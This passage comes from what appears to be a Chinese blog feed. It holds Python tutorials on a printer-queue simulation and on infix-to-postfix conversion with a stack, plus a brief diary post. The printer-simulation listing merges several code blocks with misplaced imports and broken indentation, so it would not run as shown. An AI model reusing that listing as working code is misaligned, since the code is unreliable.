title="4.模拟：打印机"></a>4.模拟：打印机</h3><p>一个更有趣的模拟是允许我们研究本节前面描述的打印机的行为，回想一下，当学生向共享打印机发送打印任务时，任务被放置在队列中以便以先来先服务的方式被处理。此配置会出现许多问题。其中最重要的点可能是打印机是否能够处理一定量的工作。如果它不能，学生将等待太长时间打印，可能会错过他们的下一节课。</p><p>在计算机科学实验室里考虑下面的情况。平均每天大约10名学生在任何给定时间在实验室工作。这些学生通常在此期间打印两次，这些任务的长度范围从1到20页。实验室中的打印机较旧，每分钟以草稿质量可以处理10页。打印机可以切换以提供更好的质量，但是它将每分钟只能处理五页。较慢的打印速度可能会使学生等待太久。应使用什么页面速率？</p><p>我们可以通过建立一个模拟实验来决定。我们将需要为学生，打印任务和打印机构建表现表示（Figure 4）。当学生提交打印任务时，我们将把他们添加到等待列表中，一个打印任务的队列。 当打印机完成任务时，它将检查队列，以检查是否有剩余的任务要处理。我们感兴趣的是学生等待他们的论文打印的平均时间。这等于任务在队列中等待的平均时间量。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.14.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E6%89%93%E5%8D%B0%E6%9C%BA/assets/3.14.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E6%89%93%E5%8D%B0%E6%9C%BA.figure4.png" alt="image"></p><p><em>Figure 4</em></p><p>为了为这种情况建模，我们需要使用一些概率。例如，学生可以打印长度从1到20页的纸张、如果从1到20的每个长度有同样的可能性。则可以通过使用1和20之间的随机数来模拟打印任务的实际长度。这意味着出现从1到20的任何长度的机会是平等的。如果实验室中有10个学生，每人打印两次，则平均每小时有20个打印任务。在任何给定的秒，打印任务将被创建的机会是什么？回答这个问题的方法时考虑任务与时间的比率。每小时20个任务意味着平均每180秒将有一个任务：<br><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.14.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E6%89%93%E5%8D%B0%E6%9C%BA/assets/3.14.%E6%A8%A1%E6%8B%9F%EF%BC%9A%E6%89%93%E5%8D%B0%E6%9C%BA.figure1.png" alt="image"></p><p>对于每一秒，我们可以通过生成1到180之间的随机数来模拟打印任务发生的机会。如果数字是180，我们说一个任务已经创建。请注意，可能会在一下子创建许多任务，或者需要等待一段时间才有任何。这就是模拟的本质。你想模拟真实的情况就需要尽可能接近一般参数。</p><h4 id="主要模拟步骤"><a href="#主要模拟步骤" class="headerlink" title="主要模拟步骤"></a>主要模拟步骤</h4><ol><li>创建打印任务的队列，每个任务都有个时间戳。队列启动的时候为空。</li><li>每秒（currentSecond）：<ul><li>是否创建新的打印任务？如果是，将 <code>currentSecond</code> 作为时间戳添加到队列。</li><li>如果打印机不忙并且有任务在等待<ul><li>从打印机队列中删除一个任务并将其分配给打印机</li><li>从 <code>currentSecond</code> 中减去时间戳，以计算该任务的等待时间。</li><li>将该任务的等待时间附件到列表中稍后处理。</li><li>根据打印任务的页数，确定需要多少时间。</li></ul></li><li>打印机需要一秒打印，所以得从该任务的所需的等待时间减去一秒。</li><li>如果任务已经完成，换句话说，所需的时间已经达到零，打印机空闲。</li></ul></li><li>模拟完成后，从生成的等待时间列表中计算平均等待时间。</li></ol><h4 id="Python实现"><a href="#Python实现" class="headerlink" title="Python实现"></a>Python实现</h4><p>为了设计此模拟，我们将为上述三个真实世界创建类：Printer，Task，PrintQueue</p><p>Printer类（Listing 2）需要跟踪它当前是否有任务。如果有，则它处于忙碌状态（13-17行），并且可以从任务的页数计算所需的时间。构造函数允许初始化每分钟页面的配置，tick方法将内部定时器递减知道打印机设置为空闲（11行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Printer</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, ppm)</span>:</span></div><div class="line">        self.pagerate = ppm</div><div class="line">        self.currentTask = <span class="keyword">None</span></div><div class="line">        self.timeRemaining = <span class="number">0</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tick</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">if</span> self.currentTask != <span class="keyword">None</span>:</div><div class="line">            self.timeRemaining = self.timeRemaining - <span class="number">1</span></div><div class="line">            <span class="keyword">if</span> self.timeRemaining &lt;= <span class="number">0</span>:</div><div class="line">                self.currentTask = <span class="keyword">None</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">busy</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">if</span> self.currentTask != <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">startNext</span><span class="params">(self,newtask)</span>:</span></div><div class="line">        self.currentTask = newtask</div><div class="line">        self.timeRemaining = newtask.getPages() * <span class="number">60</span>/self.pagerate</div><div class="line">        </div><div class="line">        <span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,time)</span>:</span></div><div class="line">        self.timestamp = time</div><div class="line">        self.pages = random.randrange(<span class="number">1</span>,<span class="number">21</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getStamp</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.timestamp</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getPages</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.pages</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">waitTime</span><span class="params">(self, currenttime)</span>:</span></div><div class="line">        <span class="keyword">return</span> currenttime - self.timestamp</div><div class="line">      </div><div class="line">      <span class="keyword">from</span> pythonds.basic.queue <span class="keyword">import</span> Queue</div><div class="line"></div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">simulation</span><span class="params">(numSeconds, pagesPerMinute)</span>:</span></div><div class="line"></div><div class="line">    labprinter = Printer(pagesPerMinute)</div><div class="line">    printQueue = Queue()</div><div class="line">    waitingtimes = []</div><div class="line"></div><div class="line">    <span class="keyword">for</span> currentSecond <span class="keyword">in</span> range(numSeconds):</div><div class="line"></div><div class="line">      <span class="keyword">if</span> newPrintTask():</div><div class="line">         task = Task(currentSecond)</div><div class="line">         printQueue.enqueue(task)</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (<span class="keyword">not</span> labprinter.busy()) <span class="keyword">and</span> (<span class="keyword">not</span> printQueue.isEmpty()):</div><div class="line">        nexttask = printQueue.dequeue()</div><div class="line">        waitingtimes.append(nexttask.waitTime(currentSecond))</div><div class="line">        labprinter.startNext(nexttask)</div><div class="line"></div><div class="line">      labprinter.tick()</div><div class="line"></div><div class="line">    averageWait=sum(waitingtimes)/len(waitingtimes)</div><div class="line">    print(<span class="string">"Average Wait %6.2f secs %3d tasks remaining."</span>%(averageWait,printQueue.size()))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">newPrintTask</span><span class="params">()</span>:</span></div><div class="line">    num = random.randrange(<span class="number">1</span>,<span class="number">181</span>)</div><div class="line">    <span class="keyword">if</span> num == <span class="number">180</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">    simulation(<span class="number">3600</span>,<span class="number">5</span>)</div></pre></td></tr></table></figure><h4 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h4><p>我们试图回答一个问题，即当前打印机是否可以处理任务负载，如果它设置为打印更好的质量，较慢的页面速率。我们采用一个方法是编写一个模拟打印作为各种页数和到达时间的随机事件的模拟。</p><p>上面的输出显示，每分钟打印5页，平均等待时间从低的17秒到高的376秒（约6分钟）。使用更快的打印速旅，低值为1秒，高值仅为 28。此外，在 10 次运行中的 8 次，每分钟 5 页，打印任务在结束时仍在队列中等待。</p><p>因此，我们说减慢打印机的速度以获得更好的质量可能不是一个好主意。学生们不能等待他们的论文打印完，特别是当他们需要到下一个班级。六分钟的等待时间太长了。</p><p>这种类型的模拟分析允许我们回答许多问题，通常被称为“如果”的问题。我们需要做的是改变模拟使用的参数，我们可以模拟任何数量。例如</p><ul><li>如果入学人数增加，平均学生人数增加20人，该怎么办？</li><li>如果是星期六，学生不需要上课怎么办？他们能负担的了吗？</li><li>如果平均打印任务的大小减少了，由于Python是一个强大的语言，程序往往要短得多？</li></ul><p>这些问题都可以通过修改上述模拟来回答。然而，重要的是要记住，模拟有效取决于构建它的假设是没问题的。关于每小时打印任务的数量和每小时的学生数量的真实数据对于构建鲁棒性的模拟是必要的。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;什么是队列&quot;&gt;&lt;a href=&quot;#什么是队列&quot; class=&quot;headerlink&quot; title=&quot;什么是队列&quot;&gt;&lt;/a&gt;什么是队列&lt;/h1&gt;&lt;p&gt;队列是项的有序结合，其中添加新项的一端称为队尾，移除项的一端称为队首。当一个元素从队尾进入队列时，一直向队首移动，直到它成为下一个需要移除的元素为止。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>生活</title>
    <link href="http://adamzeng.site/2017/10/27/%E7%94%9F%E6%B4%BB/"/>
    <id>http://adamzeng.site/2017/10/27/生活/</id>
    <published>2017-10-27T12:23:08.000Z</published>
    <updated>2017-10-27T12:26:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近缺乏睡眠，很多东西想了解的感觉不容易了解，很多时候发现精力很难跟上！<a id="more"></a></p><p>希望能够跟上各位大佬的脚步。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近缺乏睡眠，很多东西想了解的感觉不容易了解，很多时候发现精力很难跟上！
    
    </summary>
    
      <category term="生活" scheme="http://adamzeng.site/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="http://adamzeng.site/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>中缀前缀和后缀表达式</title>
    <link href="http://adamzeng.site/2017/10/27/%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://adamzeng.site/2017/10/27/中缀前缀和后缀表达式/</id>
    <published>2017-10-27T09:13:24.000Z</published>
    <updated>2017-10-27T12:28:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>当你编写一个算术表达式如 <code>B*C</code> 时，表达式的形式使你能够正确理解它。在这种情况下，你知道 B 乘以 C, 因为乘法运算符 <code>*</code> 出现在表达式中。这种类型的符号称为中缀，因为运算符在它处理的两个操作数之间。看另外一个中缀示例，<code>A+B*C</code>，运算符 <code>+</code> 和 <code>*</code> 仍然出现在操作数之间。这里面有个问题是，他们分别作用于哪个运算数上，<code>+</code> 作用于 A 和 B , 还是 <code>*</code> 作用于 B 和 C？表达式似乎有点模糊。<a id="more"></a></p><p>事实上，你已经读写过这些类型的表达式很长一段时间，所以它们对你不会导致什么问题。这是因为你知道运算符 <code>+</code>和 <code>*</code>。每个运算符都有一个优先级。优先级较高的运算符在优先级较低的运算符之前使用。唯一改变顺序的是括号的存在。算术运算符的优先顺序是将乘法和除法置于加法和减法之上。如果出现具有相等优先级的两个运算符，则使用从左到右的顺序排序或关联。</p><p>我们使用运算符优先级来解释下表达式 <code>A+B*C</code>。B 和 C 首先相乘，然后将 A 与该结果相加。<code>(A+B)*C</code> 将强制在乘法之前执行 A 和 B 的加法。在表达式 <code>A+B+C</code> 中，最左边的 + 首先使用。</p><p>虽然这一切对你来说都很明显。但请记住，计算机需要准确知道要执行的操作符和顺序。一种保证不会对操作顺序产生混淆的表达式的方法是创建一个称为完全括号表达式的表达式。这种类型的表达式对每个运算符都使用一对括号。括号没有歧义的指示操作的顺序。也没有必要记住任何优先规则。</p><p>有两种非常重要的表达式格式，你可能一开始不会很明显的看出来。中缀表达式 <code>A+B</code>, 如果我们移动两个操作数之间的运算符会发生什么？结果表达式变成 <code>+ A B</code>。同样，我们也可以将运算符移动到结尾，得到 <code>A B +</code> ，这样看起来有点奇怪。</p><p>改变操作符的位置得到了两种新的表达式格式，前缀和后缀。前缀表达式符号要求所有运算符在它们处理的两个操作数之前。另一个方面，后缀要求其操作符在相应的操作数之后。看下更多的例子 (见 Table 2)</p><p><code>A+B*C</code> 将在前缀中写为 <code>+ A * B C</code> 。乘法运算符紧接在操作数 B 和 C 之前，表示 <code>*</code> 优先于 <code>+</code>。然后加法运算符出现在 A 和乘法的结果之前。</p><p>在后缀中，表达式将是 <code>A B C * +</code>，再次，操作的顺序被保留，因为 <code>*</code> 紧接在 B 和 C 之后出现，表示 <code>*</code> 具有高优先级，<code>+</code> 优先级低。虽然操作符在它们各自的操作数前后移动，但是顺序相对于彼此保持完全相同。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.table2.png" alt="image"></p><p><em>table 2</em></p><p>现在考虑中缀表达式 <code>(A + B) * C</code>，回想下，在这种情况下，中缀需要括号在乘法之前强制执行加法。然而，当 A+B 写到前缀中时，加法运算符简单的移动到操作数 <code>+ A B</code> 之前。这个操作的结果成为乘法的第一个操作数。乘法运算符移动到整个表达式的前面，得出 <code>* + A B C</code>，同样，在后缀 <code>A B +</code>中，强制先加法。可以直接对该结果和剩余的操作数 C 相乘。然后，得出后缀表达式为 <code>A B + C *</code>。</p><p>再次考虑这三个表达式(见 Table 3)，括号不见了。为什么在前缀和后缀的时候不需要括号了呢？答案是操作符对于他们的操作数不再模糊，只有中缀才需要括号，前缀和后缀表达式的操作顺序完全由操作符的顺序决定。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.table3.png" alt="image"></p><p><em>table 3</em></p><p>Table 4 展示了一些其他的例子</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.table4.png" alt="image"></p><p><em>table 4</em></p><h4 id="1-中缀表达式转换前缀和后缀"><a href="#1-中缀表达式转换前缀和后缀" class="headerlink" title="1.中缀表达式转换前缀和后缀"></a>1.中缀表达式转换前缀和后缀</h4><p>到目前为止，我们已经使用特定方法在中缀表达式和等效前缀和后缀表达式符号之间进行转换。正如你可能期望的，有一些算法来执行转换，允许任何复杂表达式转换。</p><p>我们考虑的第一种技术使用前面讨论的完全括号表达式的概念。回想一下，<code>A + B * C</code>可以写成<code>（A +（B * C））</code>，以明确标识乘法优先于加法。然而，仔细观察，你可以看到每个括号对还表示操作数对的开始和结束，中间有相应的运算符。</p><p>看上面的子表达式<code>（B * C）</code>中的右括号。如果我们将乘法符号移动到那个位置，并删除匹配的左括号，得到得到 <code>B C *</code>，我们实际上已经将子表达式转换为后缀符号。如果加法运算符也被移动到其相应的右括号位置并且匹配的左括号被去除，则将得到完整的后缀表达式。（见Figure 6）。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure6.png" alt="image"></p><p><em>Figure 6</em></p><p>如果我们不是将符号移动到右括号的位置，我们将它向左移动，我们得到前缀符号（见 Figure 7）。圆括号对的位置实际上是包含的运算符的最终未知的线索。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure7.png" alt="image"></p><p><em>Figure 7</em></p><p>所以为了转换表达式，无论是对前缀还是后缀符号，先根据操作的顺序把表达式转换成完全括号表达式。然后将包含的预算符移动到左或右括号的位置，具体取决于需要的前缀或后缀符号。</p><p>这里面有个更复杂的例子， <code>(A + B) * C - (D - E) * (F + G)</code> ，Figure 8显示了如何转换为后缀和前缀。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure8.png" alt="image"></p><p><em>Figure 8</em></p><h4 id="1-中缀转后缀通用法"><a href="#1-中缀转后缀通用法" class="headerlink" title="1.中缀转后缀通用法"></a>1.中缀转后缀通用法</h4><p>我们需要开发一个算法来将任何中缀表达式转换为后缀表达式。为了做到这一点，我们仔细看看转换过程。</p><p>再次考虑表达式 <code>A + B * C</code>。如上所示，<code>A B C * +</code>是等价的后缀表达式。 我们已经注意到，操作数A,B,C保持在它们的相对位置。只有操作符改变位置。再看中缀表达式中的运算符。从左到右出现的第一个运算符为+。然而，在后缀表达式中，+在结束位置，因为下一个运算符*的优先级高于加法。原始表达式中的运算符的顺序在生成的后缀表达式中相反。</p><p>当我们处理表达式时，操作符必须保存在某处，因为它们相应的右操作数还没有看到。此外，这些保存的操作符的顺序可能由于它们的优先级而需要反转。这是在该示例中的加法和乘法的情况。由于加法运算符在乘法运算符之前，并且具有较低的优先级，因此需要在使用乘法运算符之后出现。由于这种顺序的反转，考虑使用栈来保存运算符知道用到它们是有意义的。</p><p><code>(A + B)* C</code>的情况会是什么样呢？ 回想一下，<code>A B + C *</code>是等价的后缀表达式。从左到右处理此中缀表达式，我们先看到 <code>+</code>。 在这种情况下，当我们看到 <code>*</code>，<code>+</code>已经放置在结果表达式中，由于括号它的优先级高于<code>*</code>。 我们现在可以开始看看转换算法如何工作。当我们看到左括号时，我们保存它，表示高优先级的另一个运算符将出现。该操作符需要等到相应的右括号出现以表示其位置（回忆完全括号的算法）。 当右括号出现时，可以从栈中弹出操作符。</p><p>当我们从左到右扫描中缀表达式时，我们将使用栈来保留运算符。这将提供我们在第一个例子中注意到的反转。 堆栈的顶部将始终是最近保存的运算符。每当我们读取一个新的运算符时，我们需要考虑该运算符如何与已经在栈上的运算符（如果有的话）比较优先级。</p><p>假设中缀表达式是一个由空格分隔的标记字符串。 操作符标记是<code>*，/，+</code>和 <code>-</code> ，以及左右括号。操作数是单字符 A，B，C 等。 以下步骤将后缀顺序生成一个字符串。</p><ol><li>创建一个名为opstack的空栈以保存运算符。给输出创建一个空列表。</li><li>通过使用字符串方法拆分将输入的中缀字符串转换为标记列表。</li><li>从左到右扫描标记列表。<ul><li>如果标记是操作数，将其附加到输出列表的末尾、</li><li>如果标记是左括号，将其压到opstack上。</li><li>如果标记是右括号，则弹出opstack，直到删除相应的左括号。将每个预算福附加到输出列表的末尾。</li><li>如果标记是运算符，<code>*，/，+</code>或 <code>-</code> ，将其压入 opstack。但是，首先删除已经在 opstack 中具有更高或相等优先级的任何运算符，并将它们加到输出列表中。</li></ul></li><li>当输入表达式被完全处理时，检查 opstack。仍然在栈上的任何运算符都可以删除并加到输出列表的末尾。</li></ol><p>Figure 9 展示了对表达式 <code>A * B + C * D</code> 的转换算法。注意，第一个 <code>*</code> 在看到 <code>+</code> 运算符时被删除。另外，当第二个 * 出现时， <code>+</code> 保留在栈中，因为乘法优先级高于加法。在中缀表达式的末尾，栈被弹出两次，删除两个运算符，并将 <code>+</code> 作为后缀表达式中的最后一个运算符。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure9.png" alt="image"></p><p><em>Figure 9</em></p><p>为了在 Python 中编写算法，我们使用一个名为 prec 的字典来保存操作符的优先级。这个字典将每个运算符映射到一个整数，可以与其他运算符的优先级（我们使用整数3，2和1）进行比较。左括号将赋予最低的值。这样，与其进行比较的任何运算符将具有更高的优先级，将被放置在它的顶部。第15行将操作数定义为任何大写字符或数字。完整的转换函数见 ActiveCode 1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.stack <span class="keyword">import</span> Stack</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">infixToPostfix</span><span class="params">(infixexpr)</span>:</span></div><div class="line">    prec = &#123;&#125;</div><div class="line">    prec[<span class="string">"*"</span>] = <span class="number">3</span></div><div class="line">    prec[<span class="string">"/"</span>] = <span class="number">3</span></div><div class="line">    prec[<span class="string">"+"</span>] = <span class="number">2</span></div><div class="line">    prec[<span class="string">"-"</span>] = <span class="number">2</span></div><div class="line">    prec[<span class="string">"("</span>] = <span class="number">1</span></div><div class="line">    opStack = Stack()</div><div class="line">    postfixList = []</div><div class="line">    tokenList = infixexpr.split()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> tokenList:</div><div class="line">        <span class="keyword">if</span> token <span class="keyword">in</span> <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> <span class="keyword">or</span> token <span class="keyword">in</span> <span class="string">"0123456789"</span>:</div><div class="line">            postfixList.append(token)</div><div class="line">        <span class="keyword">elif</span> token == <span class="string">'('</span>:</div><div class="line">            opStack.push(token)</div><div class="line">        <span class="keyword">elif</span> token == <span class="string">')'</span>:</div><div class="line">            topToken = opStack.pop()</div><div class="line">            <span class="keyword">while</span> topToken != <span class="string">'('</span>:</div><div class="line">                postfixList.append(topToken)</div><div class="line">                topToken = opStack.pop()</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">while</span> (<span class="keyword">not</span> opStack.isEmpty()) <span class="keyword">and</span> \</div><div class="line">               (prec[opStack.peek()] &gt;= prec[token]):</div><div class="line">                  postfixList.append(opStack.pop())</div><div class="line">            opStack.push(token)</div><div class="line"></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> opStack.isEmpty():</div><div class="line">        postfixList.append(opStack.pop())</div><div class="line">    <span class="keyword">return</span> <span class="string">" "</span>.join(postfixList)</div><div class="line"></div><div class="line">print(infixToPostfix(<span class="string">"A * B + C * D"</span>))</div><div class="line">print(infixToPostfix(<span class="string">"( A + B ) * C - ( D - E ) * ( F + G )"</span>))</div></pre></td></tr></table></figure><ol><li>后缀表达式求值</li></ol><p>作为最后栈的示例，我们考虑对后缀符号中的表达式求值。在这种情况下，栈再次是我们选择的数据结构。但是，在扫描后缀表达式时，它必须等待操作数，而不像上面的转换算法中的运算符。解决问题的另一种方法是，每当在输入上看到运算符时，计算两个最近的操作数。</p><p>要详细的了解这一点，考虑后缀表达式<code>4 5 6 * +</code>，首先遇到操作数<code>4</code> 和 <code>5</code>，此时你还不确定如何处理它们，直到看到下一个符号。将它们放置到栈上，确保它们在下一个操作符出现时可用。</p><p>在这种情况下，下一个符号是另一个操作数。所以，像先前一样，压入栈中。并检查下一个符号。现在我们看到操作符<code>*</code>，这意味着需要将两个最近的操作数相乘。通过弹出栈两次，我们可以得到正确的两个操作数，然后执行乘法（这种情况下结果为30）。</p><p>我们现在可以通过将其放回栈中来处理此结果，以便它可以表示为表达式后面的运算符的操作数。当处理最后一个操作符时，栈上只有一个值，弹出并返回它作为表达式的结果。Figure 10展示了整个示例表达式的栈的内容。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure10.png" alt="image"></p><p><em>Figure 10</em></p><p>Figure 11是个稍微复杂的示例，<code>7 8 + 3 2 + /</code> 。在这个例子中有两点需要注意，首先，栈的大小增长收缩，然后在子表达式求值的时候再次增长。第二，除法操作需要自信处理。回想下，后缀表达式的操作符顺序没变，仅仅改变操作符的位置。当用于除法的操作符从栈中弹出时，它们被反转。由于除法不是交换运算符，换句话说<code>15/5</code>和 <code>5/15</code> 不同，因此我们必须保证操作数的顺序不会交换。</p><p><img 